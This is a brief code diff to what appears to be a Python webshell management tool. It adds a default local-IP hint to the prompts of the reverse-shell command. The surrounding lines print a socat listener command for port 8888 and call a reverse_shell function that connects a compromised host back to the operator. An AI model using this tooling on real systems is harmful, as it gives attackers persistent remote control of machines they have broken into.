@@ -6,6 +6,7 @@ from core.shell import Shell
 from core.log import Log
 from core.db import Mysql
 from core.banner import banner
+from core.utils.network import get_ip_address
 
 import sys
 import string
@@ -62,8 +63,8 @@ def main():
             shell.interactive()
         elif context == "rsh" or context == "rshell":
             Log.info("socat file:`tty`,raw,echo=0 tcp-l:8888")
-            ip = raw_input("[IP] : ") or "127.0.0.1"
-            port = raw_input("[PORT] : ") or "8888"
+            ip = raw_input("[IP] : (%s)" % (get_ip_address())) or "127.0.0.1"
+            port = raw_input("[PORT] : (8888)") or "8888"
             Log.info("Starting reverse shell (%s:%s)" % (ip, port))
             webshell.reverse_shell(ip, port)
         elif context == "p" or context == "print":
